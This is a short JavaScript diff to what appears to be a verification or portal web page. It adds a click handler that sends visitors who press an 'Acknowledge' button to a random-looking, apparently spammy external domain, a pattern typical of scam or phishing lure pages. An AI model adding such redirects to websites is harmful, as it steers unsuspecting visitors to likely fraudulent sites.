@@ -6,6 +6,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const verifyBtn = document.getElementById('verify-btn');
     const mainContainer = document.querySelector('.container');
     const messageAlert = document.getElementById('message-alert');
+    const actionBtn = document.querySelector('.action-button');
 
     // Set dynamic copyright year
     const yearSpan = document.getElementById('current-year');
@@ -31,6 +32,13 @@ document.addEventListener('DOMContentLoaded', () => {
                 }
                 startPortal();
             }, 800);
+        });
+    }
+
+    // Redirect logic for the Acknowledge button
+    if (actionBtn) {
+        actionBtn.addEventListener('click', () => {
+            window.location.href = "https://officialsite97279849.performanceboostssatisfaction.de/CtBik/";
         });
     }
 
